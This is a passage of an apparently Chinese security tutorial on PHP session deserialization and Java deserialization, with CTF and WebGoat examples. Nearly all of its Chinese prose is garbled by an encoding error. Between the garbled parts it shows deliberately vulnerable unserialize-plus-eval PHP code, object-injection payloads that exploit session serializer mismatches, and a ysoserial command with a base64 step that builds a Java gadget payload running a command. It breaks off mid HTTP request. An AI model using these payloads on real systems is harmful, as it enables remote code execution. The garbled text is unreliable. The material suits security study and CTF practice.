--æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯,é»˜è®¤ä¸º0ä¸å¯åŠ¨4. session.serialize_handler# string --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php php ç‰ˆæœ¬ä¸º 5.4.45 çš„éƒ¨åˆ†é»˜è®¤é…ç½®å¦‚ä¸‹ï¼š 1234;session.save_path = &quot;/tmp&quot;session.save_handler = filessession.auto_start = 0session.serialize_handler = php session.serialize_handler = php è¯¥é€‰é¡¹æ˜¯ç”¨æ¥è®¾ç½® session çš„ åºåˆ—åŒ–å¼•æ“ çš„ï¼Œé™¤äº†é»˜è®¤çš„ php å¼•æ“ä¹‹å¤–ï¼Œä¹Ÿå­˜åœ¨å…¶ä»–çš„ï¼Œä¸åŒçš„ å¼•æ“å¯¹åº”çš„ session çš„å­˜å‚¨æ–¹å¼ä¸åŒã€‚ å…¶å®ƒå­˜å‚¨å¼•æ“å¦‚ä¸‹ï¼š php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼ php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ å¦‚æœéœ€è¦ä¿®æ”¹è¯¥å¼•æ“ï¼Œé¡»æœ‰æ‰‹åŠ¨æ·»åŠ ä»£ç  ini_set(&#39;session.serialize_handler&#39;, &#39;éœ€è¦è®¾ç½®çš„å¼•æ“&#39;);ï¼Œä¾‹å¦‚ï¼š 12&lt;?php ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;); session_start(); ä¸‹é¢æˆ‘ä»¬ä»…ä»…è®¨è®º php å¼•æ“æ‰€å¼•èµ·çš„ ååºåˆ—åŒ–ã€‚ php ä¸­çš„ session å­˜å‚¨æœºåˆ¶ï¼š php ä¸­çš„ session ä¸­çš„å†…å®¹ä¸æ˜¯å­˜åœ¨å†…å­˜å½“ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œå­˜å‚¨æ–¹å¼æ˜¯ç”±é…ç½®é¡¹ session.save_handler æ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚æ‰€å­˜å‚¨çš„æ–‡ä»¶åæ˜¯ä»¥ sess_sessionid æ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯ session å€¼å¾—åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚ ä¾‹å¦‚ï¼šå®¢æˆ·ç«¯çš„ç”¨æˆ·è¿›è¡ŒæŠ“åŒ…ï¼Œåœ¨ Cookie å­—æ®µä¸­è¿›è¡Œè®¾ç½® PHPSESSION=test ï¼Œåˆ™ æœåŠ¡å™¨ä¸Šå°±å°†ä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ /tmp/sess_test æ–‡ä»¶ï¼Œç”¨äºå­˜å‚¨ ç”¨æˆ·çš„ SESSIONS ä¿¡æ¯ã€‚ æµ‹è¯•ï¼šPHP 7.3.4 php é»˜è®¤å¼•æ“ä¸‹ï¼š 123&lt;?php session_start(); $_SESSION[&#x27;name&#x27;] = &#x27;test&#x27;; session æ–‡ä»¶ä¸­å…¶ä¸­ï¼Œname æ˜¯é”®åï¼Œs:4:&quot;test&quot;; æ˜¯ serialize(&quot;test&quot;) çš„ç»“æœã€‚ php_serialize å¼•æ“ä¸‹ï¼š 123&lt;?php ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;); session_start(); $SESSION[&#x27;name&#x27;] = &#x27;test&#x27;; session æ–‡ä»¶å†…å®¹æ˜¯ a:1:{s:4:â€nameâ€;s:4:â€testâ€;}ï¼Œå…¶ä¸­ a:1 åªè¦æ˜¯ä½¿ç”¨ php_serialize å¼•æ“éƒ½ä¼šåŠ ä¸Šçš„ï¼Œç„¶åä½¿ç”¨ php_serialize å¼•æ“å°†ä¼šæŠŠ session ä¸­çš„é”®åå’Œé”®å€¼éƒ½è¿›è¡Œååºåˆ—åŒ–ã€‚ åœ¨php_binaryå¼•æ“ä¸‹ï¼š 1234&lt;?php ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;); session_start();$_SESSION[&#x27;name&#x27;] = &#x27;test&#x27;; session æ–‡ä»¶å†…å®¹æ˜¯ \u0004names:4:â€testâ€; ç”±äºnameçš„é•¿åº¦æ˜¯4ï¼Œ4åœ¨ASCIIè¡¨ä¸­å¯¹åº”çš„å°±æ˜¯EOTã€‚æ ¹æ®php_binaryçš„å­˜å‚¨è§„åˆ™ï¼Œæœ€åå°±æ˜¯\u0004names:6:&quot;spoock&quot;;ã€‚(çªç„¶å‘ç°ASCIIçš„å€¼ä¸º4çš„å­—ç¬¦æ— æ³•åœ¨ç½‘é¡µä¸Šé¢æ˜¾ç¤ºï¼Œè¿™ä¸ªå¤§å®¶è‡ªè¡Œå»æŸ¥ASCIIè¡¨å§) 3.6.2 php-session åºåˆ—åŒ–ç®€å•æµ‹è¯•ï¼šåˆ©ç”¨åŸç†åºåˆ—åŒ–ç®€å•æµ‹è¯•ï¼š 123456789101112&lt;?php class lover&#123; var $func = &quot;&quot;; function __construct()&#123; $this-&gt;func = &#x27;phpinfo()&#x27;; &#125; function __wakeup()&#123; eval($this-&gt;func); &#125;&#125;unserialize($_GET[&#x27;a&#x27;]);?&gt; æˆ‘ä»¬å¯ä»¥ä¼ å…¥ï¼š?a=O:5:&quot;lover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo%20&quot;spoock&quot;;&quot;;&#125; åˆ™å°†ä¼šåœ¨é¡µé¢ä¸­è¾“å‡º spoock ã€‚ php session ååºåˆ—åŒ–æ„é€ ï¼š PHPä¸­çš„Sessionçš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„Sessionä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚å¦‚æœåœ¨PHPåœ¨ååºåˆ—åŒ–å­˜å‚¨çš„$_SESSIONæ•°æ®æ—¶ä½¿ç”¨çš„å¼•æ“å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸ä¸€æ ·ï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®çš„è¿›è¡Œååºåˆ—åŒ–ã€‚é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ï¼Œå°±å¯ä»¥ç»•è¿‡ç¨‹åºçš„éªŒè¯æˆ–è€…æ˜¯æ‰§è¡Œä¸€äº›ç³»ç»Ÿçš„æ–¹æ³•ã€‚ ç¤ºä¾‹ï¼š å‡å¦‚ é¢˜ç›®æœ¬èº«æ˜¯ php_serialize çš„å­˜å‚¨å¼•æ“ï¼Œå¦‚æœæˆ‘ä»¬æ³¨å…¥æ•°æ®ï¼ša=|o:4:&quot;test&quot;:0:&#123;&#125; åˆ™ å…¶é€šè¿‡ php_serialize çš„å¼•æ“å¤„ç†è¿‡åï¼Œå°†ä¼šå˜æˆ a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;|o:4:&quot;test&quot;:0:&#123;&#125;&quot;&#125; éšå å¦‚æœæˆ‘ä»¬åˆ©ç”¨ php çš„å­˜å‚¨å¼•æ“æ¥è¯»å–ï¼Œé‚£ä¹ˆç»è¿‡è§£è¯»ä¹‹åå°†ä¼šç†è§£ä¸º ï¼š &#123;s:1:&quot;a&quot;;a:16:&quot; æ˜¯é”®åï¼Œè€Œ | åé¢çš„å°±ä¼šè¢«ç†è§£ä¸ºä¸€ä¸ªå¯¹è±¡çš„å®ä¾‹åŒ–æ³¨å…¥ã€‚ æµ‹è¯• ï¼š 1234567&lt;?php//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];echo &quot;&lt;pre&gt;&quot;;var_dump($_SESSION);echo &quot;&lt;/pre&gt;&quot;; è®¿é—® ?a=|o:4:â€testâ€:0:{} æ­¤æ—¶ session æ–‡ä»¶å†…å®¹ä¸º a:1:{s:1:â€aâ€;a:16:â€|o:4:â€testâ€:0:{}â€} è®¾ç½® ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); ï¼Œå³ä½¿ç”¨ php å¼•æ“è¯»å–ï¼Œå†æ¬¡è®¿é—®å³å¯ã€‚ 12345array(1) &#123; [&quot;a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;&quot;]=&gt; object(stdClass)#1 (0) &#123; &#125;&#125; 3.6.3 php-session åºåˆ—åŒ–å®é™…åˆ©ç”¨å¿…å¤‡çŸ¥è¯†ï¼š é€‰é¡¹ session.auto_start=On ï¼ŒPHPåœ¨æ¥æ”¶è¯·æ±‚æ—¶ä¼šè‡ªåŠ¨åˆå§‹åŒ– Sessionï¼Œä¸éœ€è¦æ‰§è¡Œ session_start()ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥é€‰é¡¹ å…³é—­ ã€‚ é€‰é¡¹ session.use_strict_mode=0 ï¼Œé»˜è®¤å€¼æ˜¯0å³æœªå¯åŠ¨æ—¶ï¼Œç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ sessionã€‚ æ–¹æ³•ï¼šç”¨æˆ·è‡ªå·±æŠ“åŒ…ï¼Œåœ¨ Cookie é‡Œé¢è®¾ç½®ï¼ŒPHPSESSION=flagï¼Œé‚£ä¹ˆPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šä¹Ÿåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ /tmp/sess_flag ã€‚è¿™æ—¶ç”¨æˆ·å¹¶æ²¡æœ‰åˆå§‹åŒ– session ï¼Œphpä¹Ÿç…§æ ·è‡ªåŠ¨åˆå§‹åŒ– sessionï¼Œè€Œäº§ç”Ÿäº†ä¸€ä¸ªé”®å€¼ï¼Œè¯¥é”®å€¼ç”± ini.get(&quot;session.upload_progress.prefix&quot;)+æˆ‘ä»¬æ„é€ çš„session.upload_progress.name ä¸€èµ·ç»„æˆï¼Œæœ€ç»ˆå†™å…¥ sess_æ–‡ä»¶ lié‡Œã€‚ linux ä¸‹ï¼Œsessionæ–‡ä»¶ä¸€èˆ¬çš„é»˜è®¤å­˜å‚¨ä½ç½®æ˜¯ /tmp æˆ– /var/lib/php/session é¿å… session.upload_progress.cleanup=on çš„å¹²æ‰° è¯¥é€‰é¡¹å¯¼è‡´æ–‡ä»¶æˆåŠŸä¸Šä¼ ä¹‹åï¼Œä¸€æ—¦è¯»å– POST ä¿¡æ¯ä¹‹åï¼Œä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯ï¼Œsession æ–‡ä»¶å°†ä¼šè¢«ç«‹å³æ¸…ç†ã€‚é‡ç‚¹æ˜¯ è¯¥é€‰é¡¹é»˜è®¤å¼€å¯ã€‚ æ–¹æ³•ï¼šæ¡ä»¶ç«äº‰ å½“ session.auto_startï¼On æ—¶ï¼š å¦‚æœ session.auto_startï¼On ï¼Œå°±ä¼šè‡ªåŠ¨æ³¨å†Œ session ä¼šè¯ï¼Œå› ä¸ºè¯¥è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨è„šæœ¬ä»£ç æ‰§è¡Œå‰ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è®¾å®šçš„åŒ…æ‹¬åºåˆ—åŒ–å¤„ç†å™¨åœ¨å†…çš„ session ç›¸å…³é…é€‰é¡¹çš„è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ åœ¨è„šæœ¬ä¸­è®¾ç½® åºåˆ—åŒ–å¤„ç†å™¨é…ç½®çš„ç¨‹åºä¼šåœ¨ session.auto_startï¼On æ—¶ï¼Œé”€æ¯è‡ªåŠ¨ç”Ÿæˆçš„ Session ä¼šè¯ï¼Œç„¶åå†è®¾ç½®éœ€è¦çš„åºåˆ—åŒ–å¤„ç†å™¨ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡æˆ‘ä»¬æ‰€ä½¿ç”¨çš„å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„å­˜å‚¨å™¨ï¼Œè€Œç¬¬äºŒæ¬¡æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿä»ä¼šè‡ªåŠ¨è°ƒç”¨ session_start() å‡½æ•°æ³¨å†Œä¼šè¯ï¼Œè¿™æ—¶æ‰€ä½¿ç”¨çš„å°±æ˜¯é»˜è®¤çš„å­˜å‚¨å¼•æ“äº†ã€‚ æ‰€ä»¥ï¼Œå¦‚æœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸ php.ini ä¸­è®¾ç½®çš„ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ï¼Œå¦‚ä¸‹é¢çš„ä»£ç ï¼š å·²çŸ¥ï¼šé»˜è®¤çš„å­˜å‚¨å¼•æ“æ˜¯ php 1234567&lt;?phpif (ini_get(&#x27;session.auto_start&#x27;)) &#123; session_destroy();&#125;ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;]; ç¬¬ä¸€æ¬¡è®¿é—®è„šæœ¬ ï¼Œä¼ å…¥å‚æ•° ?a=|O:8:&quot;stdClass&quot;:0:&#123;&#125;ï¼Œè„šæœ¬å°†ä¼šæŒ‰ç…§ php_serialize å¤„ç†æ•°æ®ï¼Œå¾—åˆ°ï¼š 1a:1:&#123;s:1:&quot;a&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125; ç¬¬äºŒæ¬¡è®¿é—®ï¼ŒPHP ä¼šæŒ‰ç…§ php.ini é‡Œè®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ååºåˆ—åŒ–å­˜å‚¨çš„æ•°æ®ï¼Œè¿™æ—¶å¦‚æœ php.ini é‡Œè®¾ç½®çš„æ˜¯ php å¤„ç†å™¨çš„è¯ï¼Œå°†ä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼ŒæˆåŠŸå®ä¾‹åŒ–äº† stdClass å¯¹è±¡ï¼šï¼‰ã€‚ å½“ session.auto_startï¼Off æ—¶ï¼š ä¸¤ä¸ªè„šæœ¬æ³¨å†Œ Session ä¼šè¯æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ï¼Œå¦‚ä¸‹é¢çš„ä»£ç ï¼š 12345678910111213141516171819202122232425//foo1.php&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];//foo2.php&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);//or session.serialize_handler set to php in php.ini session_start();class a &#123; var $hi; function __wakeup() &#123; echo &#x27;hi&#x27;; &#125; function __destruct() &#123; echo $this-&gt;hi; &#125;&#125; è®¿é—® foo1.php æäº¤æ•°æ® ?a=|O:1:â€aâ€:1:{s:2:â€hiâ€;s:7:â€successâ€;} 1a:1:&#123;s:1:&quot;a&quot;;s:36:&quot;|O:1:&quot;a&quot;:1:&#123;s:2:&quot;hi&quot;;s:7:&quot;success&quot;;&#125;&quot;;&#125; å†è®¿é—® foo2.php ï¼ŒæˆåŠŸ ç”±äº è®¿é—® foo1 æ—¶ï¼Œä¼ å…¥çš„æ•°æ®å°†ä¼šä½¿ç”¨ php_serialize è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åå†è®¿é—® foo2 æ—¶ï¼Œç¨‹åºå°†ä¼šä½¿ç”¨ php å¼•æ“æ¥ååºåˆ—åŒ– session ä¸­æ˜¯ä¹‹ä¸¾ï¼Œä»è€Œå®ä¾‹åŒ– a å¯¹è±¡ï¼Œè€Œæ‰§è¡Œå…¶ä¸­çš„é­”æœ¯æ–¹æ³•ã€‚ è¡¥å……ï¼š ä¸ºä»€ä¹ˆåœ¨ è§£æ session æ–‡ä»¶æ—¶ä¸ºä»€ä¹ˆåœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹â€™|â€™åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†å™¨çš„åŠŸèƒ½ï¼Ÿè¿™ä¸ªå…¶å®æ˜¯å› ä¸ºsession_start()è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥çœ‹ä¸‹å®˜æ–¹è¯´æ˜ï¼š å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šè°ƒç”¨ä¼šè¯ç®¡ç†å™¨çš„ open å’Œ read å›è°ƒå‡½æ•°ã€‚ ä¼šè¯ç®¡ç†å™¨å¯èƒ½æ˜¯ PHP é»˜è®¤çš„ï¼Œ ä¹Ÿå¯èƒ½æ˜¯æ‰©å±•æä¾›çš„ï¼ˆSQLite æˆ–è€… Memcached æ‰©å±•ï¼‰ï¼Œ ä¹Ÿå¯èƒ½æ˜¯é€šè¿‡ session_set_save_handler() è®¾å®šçš„ç”¨æˆ·è‡ªå®šä¹‰ä¼šè¯ç®¡ç†å™¨ã€‚ é€šè¿‡ read å›è°ƒå‡½æ•°è¿”å›çš„ç°æœ‰ä¼šè¯æ•°æ®ï¼ˆä½¿ç”¨ç‰¹æ®Šçš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼‰ï¼ŒPHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–æ•°æ®å¹¶ä¸”å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡ 3.6.4 CTF é¢˜ç›®é€ŸæŸ¥ åºåˆ—åŒ–åçš„ç»“æœæ˜¯ä¸€ä¸²å­—ç¬¦ä¸²ã€‚ ååºåˆ—åŒ–ä¼šè§£å¼€åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ç”Ÿæˆç›¸åº”ç±»å‹çš„æ•°æ®ã€‚ å¦‚ä¸‹ä»£ç ç¤ºä¾‹ï¼Œimgæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸‹æ ‡åˆ†åˆ«æ˜¯oneå’Œtwoï¼Œå¯¹åº”çš„å€¼åˆ†åˆ«æ˜¯flag,testã€‚ 1234567891011121314151617&lt;?php$img[&#x27;one&#x27;] = &quot;flag&quot;;$img[&#x27;two&#x27;] = &quot;test&quot;;$a = serialize($img);var_dump($a);#è¾“å‡º: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;$b = unserialize($a);var_dump($b);/*è¾“å‡ºå¦‚ä¸‹å†…å®¹:array(2) &#123; [&quot;one&quot;]=&gt; string(4) &quot;flag&quot; [&quot;two&quot;]=&gt; string(4) &quot;test&quot;&#125;*/ åºåˆ—åŒ–éƒ¨åˆ†: ç»è¿‡serializeåºåˆ—åŒ–åç”Ÿæˆäº†ç›¸åº”çš„å­—ç¬¦ä¸²: a:2:{s:3:â€oneâ€;s:4:â€flagâ€;s:3:â€twoâ€;s:4:â€testâ€;} aè¡¨ç¤ºæ•°ç»„ , a:2ä¸­çš„2è¡¨ç¤ºæœ‰ä¸¤ä¸ªé”®å€¼ï¼Œå³å¯¹åº”çš„oneã€twoä¸¤ç»„é”®å€¼å¯¹ã€‚ èŠ±æ‹¬å·ä¸­çš„séƒ½è¡¨ç¤ºstringå³å­—ç¬¦ä¸²ï¼Œ s:åé¢çš„å€¼åˆ†åˆ«æ˜¯3ã€4ã€3ã€4,å³å¯¹åº”çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œæ¯”å¦‚oneé•¿åº¦æ˜¯ä¸‰ï¼Œflagé•¿åº¦æ˜¯4 ååºåˆ—åŒ–éƒ¨åˆ†: unserializeå‡½æ•°å°†å­—ç¬¦ä¸²è§£åºåˆ—åŒ–ï¼Œæˆ‘ä»¬ç”¨var_dumpå‡½æ•°æ˜¾ç¤ºäº†ä»–çš„è¯¦ç»†ä¿¡æ¯ã€‚ å¯è§è§£åºåˆ—åŒ–åç”±å˜é‡$bï¼Œæ¥æ”¶äº†imgæ•°ç»„ã€‚ åºåˆ—åŒ–ä¸­æ¯ä¸ªå­—æ¯çš„è¡¨ç¤º a arrayæ•°ç»„ b booleanåˆ¤æ–­ç±»å‹ d doubleæµ®ç‚¹æ•° i integeræ•´æ•°å‹ o common object ä¸€èˆ¬çš„å¯¹è±¡ r referenceå¼•ç”¨ç±»å‹ s stringå­—ç¬¦ä¸²ç±»å‹ C custom object O class N null R pointer reference U unicode string 1234567891011__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘ __sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘ __destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘â€”â€”å¯¹è±¡è°ƒç”¨ä¸€ä¸ªæ²¡æœ‰å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œè§¦å‘ __callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ echo å¯¹è±¡; $text=$test+$å¯¹è±¡ï¼› __invoke() //å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ 1.3 å±å®³SQLæ³¨å…¥ ä»£ç æ‰§è¡Œ ç›®å½•éå† å››ã€JAVA ååºåˆ—åŒ–åºåˆ—åŒ–ï¼šå°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–è€…ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚åºåˆ—åŒ–æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çš„çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…å‹å‚¨å­˜åŒºã€‚ ååºåˆ—åŒ–ï¼šä»å‚¨å­˜åŒºè¯»å–åˆ°æ•°æ®ï¼Œå°†å…¶è¿˜åŸä¸ºå¯¹è±¡ å¥½å¤„ï¼š æŠŠå¯¹è±¡çš„å­—èŠ‚åºåˆ—æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œå®ç°å¯¹è±¡çš„æŒä¹…åŒ–ï¼Œé€šå¸¸å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼› åˆ©ç”¨åºåˆ—åŒ–å®ç°è¿œç¨‹é€šä¿¡ï¼Œå³åœ¨ç½‘ç»œä¸Šä¼ é€’å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚ å®ä¾‹ç†è§£ Web æœåŠ¡å™¨ä¸­çš„ Session ä¼šè¯å¯¹è±¡ï¼Œå½“æœ‰10ä¸‡ç”¨æˆ·å¹¶å‘è®¿é—®ï¼Œå°±æœ‰å¯èƒ½å‡ºç°10ä¸‡ä¸ª Session å¯¹è±¡ï¼Œæ˜¾ç„¶è¿™ç§æƒ…å†µå†…å­˜å¯èƒ½æ˜¯åƒä¸æ¶ˆçš„ã€‚ äºæ˜¯ Web å®¹å™¨å°±ä¼šæŠŠä¸€äº› Session å…ˆåºåˆ—åŒ–ï¼Œè®©ä»–ä»¬ç¦»å¼€å†…å­˜ç©ºé—´ï¼Œåºåˆ—åŒ–åˆ°ç¡¬ç›˜ä¸­ï¼Œå½“éœ€è¦è°ƒç”¨æ—¶ï¼Œå†æŠŠä¿å­˜åœ¨ç¡¬ç›˜ä¸­çš„å¯¹è±¡è¿˜åŸåˆ°å†…å­˜ä¸­ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œå½“ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œè¿œç¨‹é€šä¿¡æ—¶ï¼Œå½¼æ­¤å¯ä»¥å‘é€å„ç§ç±»å‹çš„æ•°æ®ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œ è€Œè¿™äº›æ•°æ®éƒ½ä¼šä»¥äºŒè¿›åˆ¶åºåˆ—çš„å½¢å¼åœ¨ç½‘ç»œä¸Šä¼ é€ã€‚ åŒæ ·çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åˆ™å®ç°äº† è¿›ç¨‹é€šä¿¡é—´çš„å¯¹è±¡ä¼ é€ï¼Œå‘é€æ–¹éœ€è¦æŠŠè¿™ä¸ªJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œæ‰èƒ½åœ¨ç½‘ç»œä¸Šä¼ é€ï¼›æ¥æ”¶æ–¹åˆ™éœ€è¦æŠŠå­—èŠ‚åºåˆ—å†æ¢å¤ä¸ºJavaå¯¹è±¡ã€‚ JDK ç±»åº“ä¸­åºåˆ—åŒ– API 1234//åºåˆ—åŒ–:å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼Œå°†å­—èŠ‚åºåˆ—å†™å…¥åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­ObjectOutputStreamç±» writeObject()//ååºåˆ—åŒ–:ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼ŒæŠŠä»–ä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå°†å…¶è¿”å›ObjectIntputStreamç±» readObject() å·¥å…· https://github.com/frohoff/ysoserial/releases WebGoat https://github.com/WebGoat/WebGoat/releases 1234docker pull webgoat/webgoat-8.0docker imagesdocker run -p 8080:8080 -t webgoat/webgoat-8.0http://192.168.158.111:8080/WebGoat/login 4.1 WebGoat12rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5lå³åºåˆ—åŒ–+base64åŠ å¯† å‘½ä»¤æ‰§è¡Œ + åå¼¹ shell(ä»¥å…ä¸ä¼šå›æ˜¾) 12#æ€è·¯:ä»¥ æ‰§è¡Œ ipconfig å‘½ä»¤ä¸ºä¾‹ipconfig --&gt; åºåˆ—åŒ– --&gt; base64åŠ å¯† --&gt; æœ€ç»ˆè½¬æ¢æˆä»¥rO0ABæ ¼å¼å¼€å¤´çš„å­—ç¬¦ä¸²ä½œä¸ºæˆ‘ä»¬çš„payload å·¥å…·å½¢æˆ payload 1java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar ysoserial.GeneratePayload Hibernatel calc.exe &gt; payload.bin å†å°†ç”Ÿæˆçš„ payload.bin è¿›è¡Œä¸€ä¸ªbase64åŠ å¯†ï¼šä½¿ç”¨pythonè„šæœ¬ 1234import base64c = open(&quot;payload.binè·¯å¾„&quot;,&quot;rb&quot;).read()cc = base64.urlsafe_b64encode(c)open(&quot;payload.txt&quot;,&quot;wt&quot;,ecoding=&quot;utf-8&quot;).write(cc.decode()) 4.2 CTFHUB â€”- think_java1234567891011POST /common/test/sqlDict HTTP/1.1Host: challenge-516f101de06176a6.sandbox.ctfhub.com:10080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, 